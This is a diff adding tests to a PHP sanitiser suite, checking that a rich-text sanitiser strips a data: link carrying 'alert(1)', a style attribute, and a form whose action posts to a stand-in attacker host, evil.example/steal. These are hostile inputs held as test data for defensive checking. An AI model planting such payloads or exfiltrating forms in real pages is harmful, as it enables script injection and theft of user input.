@@ -23,6 +23,30 @@ it('strips a javascript href but keeps the link text', function () {
         ->and($clean)->toContain('Click');
 });
 
+it('strips a data href but keeps the link text', function () {
+    $dirty = '<a href="data:text/html,alert(1)">Click</a>';
+    $clean = RichTextSanitiser::sanitise($dirty);
+
+    expect($clean)->not->toContain('data:')
+        ->and($clean)->toContain('Click');
+});
+
+it('strips a style attribute', function () {
+    $dirty = '<p style="display:none">Hello</p>';
+    $clean = RichTextSanitiser::sanitise($dirty);
+
+    expect($clean)->not->toContain('style')
+        ->and($clean)->toContain('Hello');
+});
+
+it('strips a form and its input', function () {
+    $dirty = '<form action="https://evil.example/steal"><input type="text" name="x"></form>';
+    $clean = RichTextSanitiser::sanitise($dirty);
+
+    expect($clean)->not->toContain('<form')
+        ->and($clean)->not->toContain('<input');
+});
+
 it('keeps legitimate formatting and links', function () {
     $clean = RichTextSanitiser::sanitise(
         '<h2>Waste</h2><p><strong>Bold</strong> and <em>italic</em></p>'
